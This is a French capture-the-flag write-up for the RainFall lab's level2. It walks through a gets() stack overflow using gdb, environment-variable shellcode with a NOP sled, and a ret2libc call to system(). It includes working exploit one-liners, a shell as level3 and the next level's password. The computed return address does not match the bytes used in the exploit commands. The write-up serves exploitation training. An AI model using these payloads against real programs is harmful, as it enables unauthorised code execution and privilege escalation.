Read also: [./Resources/README.md](./Resources/README.md)

# Source

```c
void p(void)
{
  uint unaff_retaddr;
  char local_50 [76];
 
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}

int main(void) {
    p();
    return 0;
}
```

# Explication

Il s'agit d'un buffer overflow. On va donc récupérer les valeurs nécessaire à son exploit EIP,
adresse vers le shellcode ou chaine de caractère /bin/sh

**EIP:**

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:    push   %ebp
   0x08048540 <+1>:    mov  %esp,%ebp
   0x08048542 <+3>:    and  $0xfffffff0,%esp
   0x08048545 <+6>:    call   0x80484d4 <p>
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret 
```

Donc 0x0804854b => \x4b\x85\x04\x08

**Adresse de la variable d'environnement :**

Pour obtenir l'adresse d'une variable d'environnement : gdb exploit_me > b main > run > x/10s *((char **)environ).

```
(gdb) b main
(gdb) run

(gdb) x/80s *((char **)environ)
0xbffffbd9:     "ICE=
```

On récupére l'adresse du milieu du padding (de 1000) donc +500.

Donc 0xbffffbd9 + 500 = bf ff fd cd ⇒ \xcd\xfd\xff\xbf

## Méthode avec shellcode :

On utilise le shellcode suivant: https://www.exploit-db.com/exploits/13357

Et on ajoute un padding (\x90) de 1000 pour être tranquille. (On peut faire sans mais ça ajoute une marge de sécurité si l'agencement change).

```sh
export ICE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
```

Maintenant on peut lancer l'exploit avec un argument de 80 caractères (76 + 4) pour overflow le buffer.

Exploit :

```
level2@RainFall:~$ (python -c "print('a' * 80 + '\x4b\x85\x04\x08' + '\xcd\xfb\xff\xbf')"; cat) | ./level2
[…]
$ whoami
level3
```
## Méthode sans shellcode :

Adresse de la fonction system :
```
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

Donc 0xb7e6b060 => \x60\xb0\xe6\xb7

Technique sans schellcode :

```
level2@RainFall:~$ export ICE=$(python -c "print ' ' * 1000 + '/bin/sh'")
level2@RainFall:~$ (python -c "print('a' * 80 + '\x4b\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '0000' + '\xcd\xfb\xff\xbf')"; cat) | ./level2
[…]
cat /home/user/level3/.pass      
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
